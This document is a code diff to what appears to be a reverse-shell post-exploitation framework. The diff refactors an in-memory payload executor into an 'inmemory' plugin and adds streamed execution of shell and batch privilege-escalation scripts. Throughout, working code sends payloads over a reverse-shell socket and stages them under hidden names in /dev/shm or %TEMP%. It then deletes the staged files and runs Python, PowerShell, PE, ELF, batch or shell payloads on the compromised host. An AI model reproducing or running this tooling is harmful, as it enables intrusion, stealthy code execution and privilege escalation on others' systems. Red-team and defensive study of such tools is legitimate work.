@@ -1,12 +1,14 @@
-"""In-memory payload transfer and execution over the reverse shell channel."""
+"""Cross-platform in-memory payload execution plugin."""
 
 import json
 import os
 import re
 import secrets
+import select
+import sys
 import time
 
-from .constants import (
+from ...constants import (
     CHUNK_SIZE,
     EXEC_MARK_END,
     EXEC_MARK_START,
@@ -14,18 +16,36 @@ from .constants import (
     XFER_MARK_END,
     XFER_MARK_START,
 )
-from .sysinfo import _b64_exec_cmd
+from ...sysinfo import _b64_exec_cmd
+from ..api import plugin, SessionContext
+
+FILETYPE_ALIASES = {
+    'py': 'python',
+    'ps': 'powershell',
+    'exe': 'pe',
+    'elf': 'elf',
+    'bat': 'bat',
+    'cmd': 'bat',
+    'sh': 'shell',
+    'bash': 'shell',
+    'python': 'python',
+    'powershell': 'powershell',
+    'pe': 'pe',
+}
+
+INMEMORY_FILETYPES = ('py', 'ps', 'exe', 'elf', 'bat', 'sh')
+STREAMING_FILETYPES = ('shell', 'bat')
+STREAM_EXIT_MARK = '[exit:'
+INMEMORY_USAGE = (
+    'run inmemory <filetype> <local_file> [-- args] [--save-output <file>]\n'
+    '  filetype: py, ps, exe, elf, bat, sh'
+)
 
 
-class PayloadExecutor:
+class InMemoryExecutor:
     """Chunked payload delivery with SHA256 verification and in-memory execution."""
 
-    TYPE_ALIASES = {
-        'runpy': 'python',
-        'runps': 'powershell',
-        'runexe': 'pe',
-        'runelf': 'elf',
-    }
+    TYPE_ALIASES = FILETYPE_ALIASES
 
     def __init__(self, handler):
         self.h = handler
@@ -33,13 +53,13 @@ class PayloadExecutor:
     def _chunk_size_for(self, shell_type):
         return CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])
 
-    def _staging_path(self, shell_type, token=None):
+    def staging_path(self, shell_type, token=None):
         token = token or secrets.token_hex(6)
         if shell_type == 'windows':
             return token, f".tornado_{token}"
         return token, f"/dev/shm/.tornado_{token}"
 
-    def _resolve_staging_path(self, client_sock, shell_type, staging_name):
+    def resolve_staging_path(self, client_sock, shell_type, staging_name):
         if shell_type == 'windows':
             win_ps = (
                 f"'{XFER_MARK_START}'+[IO.Path]::Combine($env:TEMP,'{staging_name}')+'{XFER_MARK_END}'"
@@ -78,38 +98,39 @@ class PayloadExecutor:
             pass
         return {'stdout': payload, 'stderr': '', 'exit_code': None}, trailing
 
-    def _parse_args(self, cmd_parts, from_client=False):
+    @staticmethod
+    def _parse_flagged_args(parts, start_index=0):
         save_output = None
-        exec_args = []
         payload_args = []
         positional = []
-        i = 1
-        while i < len(cmd_parts):
-            part = cmd_parts[i]
-            if part == '--save-output' and i + 1 < len(cmd_parts):
-                save_output = cmd_parts[i + 1]
+        i = start_index
+        while i < len(parts):
+            part = parts[i]
+            if part == '--save-output' and i + 1 < len(parts):
+                save_output = parts[i + 1]
                 i += 2
                 continue
             if part == '--':
-                payload_args = cmd_parts[i + 1:]
+                payload_args = parts[i + 1:]
                 break
             if part.startswith('--') and part != '--':
-                exec_args.append(part)
                 i += 1
                 continue
             positional.append(part)
             i += 1
-        if from_client:
-            local_path = positional[0] if positional else None
-            session_id = None
-        else:
-            session_id = positional[0] if len(positional) > 0 else None
-            local_path = positional[1] if len(positional) > 1 else None
-            if len(positional) > 2 and not payload_args:
-                payload_args = positional[2:]
-        return session_id, local_path, payload_args, save_output, exec_args
+        return positional, payload_args, save_output
 
-    def _resolve_type(self, command_name, local_path):
+    @staticmethod
+    def parse_plugin_args(args):
+        """Parse inmemory plugin args: <filetype> <local_path> [-- args] [--save-output <file>]."""
+        positional, payload_args, save_output = InMemoryExecutor._parse_flagged_args(args)
+        filetype = positional[0].lower() if len(positional) > 0 else None
+        local_path = positional[1] if len(positional) > 1 else None
+        if len(positional) > 2 and not payload_args:
+            payload_args = positional[2:]
+        return filetype, local_path, payload_args, save_output
+
+    def resolve_type(self, command_name, local_path):
         alias = self.TYPE_ALIASES.get(command_name.lower())
         if alias:
             return alias
@@ -118,6 +139,10 @@ class PayloadExecutor:
             '.py': 'python',
             '.ps1': 'powershell',
             '.exe': 'pe',
+            '.bat': 'bat',
+            '.cmd': 'bat',
+            '.sh': 'shell',
+            '.bash': 'shell',
         }
         return mapping.get(ext, 'elf')
 
@@ -130,7 +155,7 @@ class PayloadExecutor:
     def _json_escape(self, value):
         return json.dumps(value)
 
-    def _transfer_payload(self, client_sock, local_path, remote_path, shell_type):
+    def transfer_payload(self, client_sock, local_path, remote_path, shell_type):
         if not os.path.isfile(local_path):
             print(f"{self.h.colors['red']}Local file not found: {local_path}{self.h.colors['end']}")
             return None, None
@@ -449,6 +474,209 @@ print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
             ('python', 'python'),
         )), None
 
+    def _build_shell_stream_exec(self, remote_path, expected_hash, shell_type):
+        path = self.h._escape_path(remote_path, shell_type)
+        py_body = f"""
+import hashlib, os, subprocess, sys
+path = {self._json_escape(path)}
+expected = {self._json_escape(expected_hash)}
+try:
+    with open(path, 'rb') as fh:
+        data = fh.read()
+    try:
+        os.remove(path)
+    except Exception:
+        pass
+    if hashlib.sha256(data).hexdigest() != expected:
+        print('SHA256 verification failed', file=sys.stderr)
+        print('\\n[exit:1]', flush=True)
+        sys.exit(1)
+    proc = subprocess.Popen(['bash', '-s'], stdin=subprocess.PIPE, stdout=sys.stdout, stderr=sys.stderr)
+    proc.communicate(input=data)
+    code = proc.returncode if proc.returncode is not None else 1
+    print(f'\\n[exit:{{code}}]', flush=True)
+    sys.exit(code)
+except Exception as exc:
+    print(str(exc), file=sys.stderr)
+    print('\\n[exit:1]', flush=True)
+    sys.exit(1)
+"""
+        return _b64_exec_cmd(py_body, (
+            ('python3', 'python'),
+            ('python', 'python'),
+        )), None
+
+    def _build_bat_stream_exec(self, remote_path, expected_hash):
+        path = self._escape_for_ps(self.h._escape_path(remote_path, 'windows'))
+        return None, f"""
+$ErrorActionPreference='Continue'
+$p='{path}';$expected='{expected_hash}'
+try {{
+  if(-not (Test-Path -LiteralPath $p)) {{ throw "Staging file not found: $p" }}
+  $bytes=[IO.File]::ReadAllBytes($p)
+  Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
+  $hash=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLower()
+  if($hash -ne $expected) {{ throw 'SHA256 verification failed' }}
+  $tmp=Join-Path $env:TEMP ([IO.Path]::GetRandomFileName()+'.bat')
+  try {{
+    [IO.File]::WriteAllBytes($tmp,$bytes)
+    & cmd.exe /c "`"$tmp`"" 2>&1
+    Write-Output "`n[exit:$LASTEXITCODE]"
+  }} finally {{
+    if(Test-Path -LiteralPath $tmp) {{ Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }}
+  }}
+}} catch {{
+  Write-Output $_.Exception.Message
+  Write-Output "`n[exit:1]"
+}}
+""".strip()
+
+    def _stream_command(self, client_sock, unix_cmd, win_ps, shell_type, timeout=7200.0, idle_timeout=120.0):
+        self.h._flush_shell(client_sock, timeout=1.0)
+        if shell_type == 'windows' and win_ps:
+            cmd = self.h._win_ps_cmd(win_ps)
+        elif unix_cmd:
+            cmd = unix_cmd
+        else:
+            return ''
+        if not self.h.send_to_revshell(client_sock, cmd):
+            return ''
+        deadline = time.time() + timeout
+        last_data = time.time()
+        parts = []
+        while time.time() < deadline:
+            remaining = min(1.0, deadline - time.time())
+            if remaining <= 0:
+                break
+            try:
+                r, _, _ = select.select([client_sock], [], [], remaining)
+            except Exception:
+                break
+            if r:
+                try:
+                    chunk = client_sock.recv(65536)
+                except Exception:
+                    break
+                if not chunk:
+                    break
+                text = chunk.decode(errors='ignore')
+                parts.append(text)
+                last_data = time.time()
+                sys.stdout.write(text)
+                sys.stdout.flush()
+            elif time.time() - last_data >= idle_timeout:
+                break
+        return ''.join(parts)
+
+    @staticmethod
+    def parse_stream_exit(output):
+        for line in reversed((output or '').splitlines()):
+            stripped = line.strip()
+            if stripped.startswith(STREAM_EXIT_MARK) and stripped.endswith(']'):
+                try:
+                    return int(stripped[len(STREAM_EXIT_MARK):-1])
+                except ValueError:
+                    pass
+                break
+        return None
+
+    def _save_combined_output(self, output, save_output):
+        if not save_output or not output:
+            return False
+        try:
+            out_dir = os.path.dirname(os.path.abspath(save_output))
+            if out_dir:
+                os.makedirs(out_dir, exist_ok=True)
+            with open(save_output, 'w', encoding='utf-8') as handle:
+                handle.write(output)
+            print(f"{self.h.colors['blue']}Output saved to {save_output}{self.h.colors['end']}")
+            return True
+        except OSError as exc:
+            print(f"{self.h.colors['red']}Failed to save output: {exc}{self.h.colors['end']}")
+            return False
+
+    def execute_streaming(
+        self,
+        client_sock,
+        local_path,
+        kind,
+        save_output=None,
+        timeout=7200.0,
+        idle_timeout=120.0,
+    ):
+        """Verified transfer + long-running streamed execution for privesc tools."""
+        info = self.h._client_info(client_sock)
+        if not info:
+            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
+            return {'success': False, 'detail': 'disconnected'}
+        if kind not in STREAMING_FILETYPES:
+            print(f"{self.h.colors['red']}Unsupported privesc kind: {kind}{self.h.colors['end']}")
+            return {'success': False, 'detail': 'unsupported_kind'}
+
+        shell_type = info.get('type', 'unknown')
+        name = os.path.basename(local_path)
+        payload_type = 'pe' if kind == 'pe' else ('powershell' if kind == 'bat' else 'python')
+        _, staging_name = self.staging_path(shell_type if shell_type != 'unknown' else 'unix')
+        if shell_type == 'unknown':
+            shell_type = self._resolve_shell_type(client_sock, shell_type, staging_name, payload_type)
+        remote_path = self.resolve_staging_path(client_sock, shell_type, staging_name)
+
+        start_time = time.time()
+        digest, remote_path = self.transfer_payload(client_sock, local_path, remote_path, shell_type)
+        if not digest:
+            return {
+                'success': False,
+                'detail': 'transfer_failed',
+                'runtime_ms': int((time.time() - start_time) * 1000),
+            }
+
+        shell_type = self._resolve_shell_type(client_sock, shell_type, remote_path, payload_type)
+        method_map = {'shell': 'shell-stream', 'bat': 'bat-stream'}
+        method = method_map[kind]
+
+        if kind == 'shell':
+            if shell_type == 'windows':
+                print(f"{self.h.colors['red']}Shell privesc scripts require a Unix session{self.h.colors['end']}")
+                self._cleanup_staging(client_sock, remote_path, shell_type)
+                return {'success': False, 'detail': 'platform_mismatch'}
+            unix_cmd, win_ps = self._build_shell_stream_exec(remote_path, digest, shell_type)
+        else:
+            if shell_type != 'windows':
+                print(f"{self.h.colors['red']}Batch privesc requires a Windows session{self.h.colors['end']}")
+                self._cleanup_staging(client_sock, remote_path, shell_type)
+                return {'success': False, 'detail': 'platform_mismatch'}
+            unix_cmd, win_ps = self._build_bat_stream_exec(remote_path, digest)
+
+        print(
+            f"{self.h.colors['yellow']}Executing {name} ({method}) — streaming output...{self.h.colors['end']}"
+        )
+        output = self._stream_command(
+            client_sock, unix_cmd, win_ps, shell_type,
+            timeout=timeout, idle_timeout=idle_timeout,
+        )
+        runtime_ms = int((time.time() - start_time) * 1000)
+        exit_code = self.parse_stream_exit(output)
+        success = exit_code == 0 if exit_code is not None else bool(output.strip())
+        self._save_combined_output(output, save_output)
+        result = {
+            'success': success,
+            'exit_code': exit_code,
+            'output': output,
+            'method': method,
+            'sha256': digest,
+            'runtime_ms': runtime_ms,
+        }
+        self._log_execution(client_sock, {
+            'name': name,
+            'type': f'privesc-{kind}',
+            'sha256': digest,
+            'method': method,
+            'exit_code': exit_code,
+            'success': success,
+            'runtime_ms': runtime_ms,
+        })
+        return result
+
     def _run_exec_command(self, client_sock, unix_cmd, win_ps, shell_type, timeout=120.0):
         def _attempt(use_win):
             self.h._flush_shell(client_sock)
@@ -512,7 +740,7 @@ print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
             except OSError as exc:
                 print(f"{self.h.colors['red']}Failed to save output: {exc}{self.h.colors['end']}")
 
-    def execute(self, client_sock, local_path, payload_type, payload_args=None, save_output=None):
+    def execute(self, client_sock, local_path, payload_type, payload_args=None, save_output=None, timeout=None):
         info = self.h._client_info(client_sock)
         if not info:
             print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
@@ -524,13 +752,13 @@ print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
         shell_type = info.get('type', 'unknown')
         payload_args = payload_args or []
         name = os.path.basename(local_path)
-        _, staging_name = self._staging_path(shell_type if shell_type != 'unknown' else 'unix')
+        _, staging_name = self.staging_path(shell_type if shell_type != 'unknown' else 'unix')
         if shell_type == 'unknown':
             shell_type = self._resolve_shell_type(client_sock, shell_type, staging_name, payload_type)
-        remote_path = self._resolve_staging_path(client_sock, shell_type, staging_name)
+        remote_path = self.resolve_staging_path(client_sock, shell_type, staging_name)
 
         start_time = time.time()
-        digest, remote_path = self._transfer_payload(client_sock, local_path, remote_path, shell_type)
+        digest, remote_path = self.transfer_payload(client_sock, local_path, remote_path, shell_type)
         if not digest:
             self._log_execution(client_sock, {
                 'name': name, 'type': payload_type, 'success': False,
@@ -566,7 +794,7 @@ print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
             unix_cmd, _ = self._build_elf_exec(remote_path, digest, payload_args)
 
         print(f"{self.h.colors['yellow']}Executing {name} in memory...{self.h.colors['end']}")
-        exec_timeout = 600.0 if payload_type == 'pe' else 120.0
+        exec_timeout = timeout if timeout is not None else (600.0 if payload_type == 'pe' else 120.0)
         result = self._run_exec_command(client_sock, unix_cmd, win_ps, shell_type, timeout=exec_timeout)
         runtime_ms = int((time.time() - start_time) * 1000)
         success = bool(result) and result.get('exit_code') in (0, None)
@@ -583,19 +811,66 @@ print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
         })
         return success
 
-    def handle_command(self, client_sock, cmd_parts, from_client=False):
-        if not cmd_parts:
-            return False
-        command = cmd_parts[0].lower()
-        if command not in self.TYPE_ALIASES:
-            return False
-        _, local_path, payload_args, save_output, _ = self._parse_args(cmd_parts, from_client=from_client)
-        if not local_path:
-            usage = f"{command} <local_file> [-- args...] [--save-output <file>]"
-            if not from_client:
-                usage = f"{command} <ID> <local_file> [-- args...] [--save-output <file>]"
-            print(f"{self.h.colors['red']}Usage: {usage}{self.h.colors['end']}")
-            return True
-        payload_type = self._resolve_type(command, local_path)
-        self.execute(client_sock, local_path, payload_type, payload_args=payload_args, save_output=save_output)
-        return True
+
+def _executor_for(session: SessionContext) -> InMemoryExecutor:
+    handler = session._handler
+    executor = getattr(handler, 'inmemory', None)
+    if executor is None:
+        executor = InMemoryExecutor(handler)
+        handler.inmemory = executor
+    return executor
+
+
+@plugin.command(
+    name='inmemory',
+    platforms=['linux', 'windows', 'unix'],
+    description='In-memory execution: py, ps, exe, elf, bat, sh',
+)
+def run(session: SessionContext, args):
+    filetype, local_path, payload_args, save_output = InMemoryExecutor.parse_plugin_args(args)
+    if not filetype or not local_path:
+        session.print(f'Usage: {INMEMORY_USAGE}', 'red')
+        return 1
+
+    executor = _executor_for(session)
+    payload_type = executor.resolve_type(filetype, local_path)
+    all_types = set(PAYLOAD_EXEC_TYPES) | set(STREAMING_FILETYPES)
+    if payload_type not in all_types:
+        session.print(
+            f"Unknown filetype '{filetype}' — supported: {', '.join(INMEMORY_FILETYPES)}",
+            'red',
+        )
+        return 1
+
+    if payload_type in STREAMING_FILETYPES:
+        result = executor.execute_streaming(
+            session.socket,
+            local_path,
+            payload_type,
+            save_output=save_output,
+            timeout=7200.0,
+            idle_timeout=120.0,
+        )
+        if result.get('detail') == 'transfer_failed':
+            return 1
+        success = result.get('success', False)
+        exit_code = result.get('exit_code')
+        method = result.get('method', 'unknown')
+        color = 'green' if success else 'yellow'
+        session.print(
+            f"Completed — method: {method} — "
+            f"exit: {exit_code if exit_code is not None else 'unknown'}",
+            color,
+        )
+        return 0 if success else 1
+
+    exec_timeout = 7200.0 if payload_type == 'pe' else None
+    success = executor.execute(
+        session.socket,
+        local_path,
+        payload_type,
+        payload_args=payload_args,
+        save_output=save_output,
+        timeout=exec_timeout,
+    )
+    return 0 if success else 1
